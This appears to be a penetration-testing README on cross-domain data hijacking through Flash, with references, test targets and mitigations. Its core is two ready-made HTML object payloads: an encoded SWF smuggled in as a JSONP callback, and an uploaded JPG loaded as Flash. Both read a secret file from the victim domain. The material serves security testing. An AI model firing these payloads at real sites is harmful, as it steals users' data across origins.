###Cross Domain Data Hijacking

See:
1) http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website

2) https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/

3) http://50.56.33.56/blog/?p=242

####What to test?

- JSONP Callback Names (Most are unsanitised)
- File Uploads (Upload the JPG found in this folder as any format)
- Any API/End-point which allows for users to inject arbritary content in the beginning of a document

If JSONP is encountered, attempt the following exploit:
```
<object style="height:1px;width:1px;" data="http://victim.com/user/jsonp?callback=CWS%07%0E000x%9C%3D%8D1N%C3%40%10E%DF%AE%8D%BDI%08%29%D3%40%1D%A0%A2%05%09%11%89HiP%22%05D%8BF%8E%0BG%26%1B%D9%8E%117%A0%A2%DC%82%8A%1Br%04X%3B%21S%8C%FE%CC%9B%F9%FF%AA%CB7Jq%AF%7F%ED%F2%2E%F8%01%3E%9E%18p%C9c%9Al%8B%ACzG%F2%DC%BEM%EC%ABdkj%1E%AC%2C%9F%A5%28%B1%EB%89T%C2Jj%29%93%22%DBT7%24%9C%8FH%CBD6%29%A3%0Bx%29%AC%AD%D8%92%FB%1F%5C%07C%AC%7C%80Q%A7Nc%F4b%E8%FA%98%20b%5F%26%1C%9F5%20h%F1%D1g%0F%14%C1%0A%5Ds%8D%8B0Q%A8L%3C%9B6%D4L%BD%5F%A8w%7E%9D%5B%17%F3%2F%5B%DCm%7B%EF%CB%EF%E6%8D%3An%2D%FB%B3%C3%DD%2E%E3d1d%EC%C7%3F6%CD0%09" type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="c=alert&u=http://victim.com/secret_file.txt"></object>
```

PoC2.jpg in this directory can be uploaded and used like directed in the Detectify blog post.

```
<object style="height:1px;width:1px;" data="http://victim.com/user/PoC2.jpg" type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="c=alert&u=http://victim.com/secret_file.txt"></object>
```

####How to mitigate?

- Use a sandboxed domain for user content
- Use the Content-Disposition header
- Validate JSONP Callback names

All credit to Soroush for the PoC included in this folder.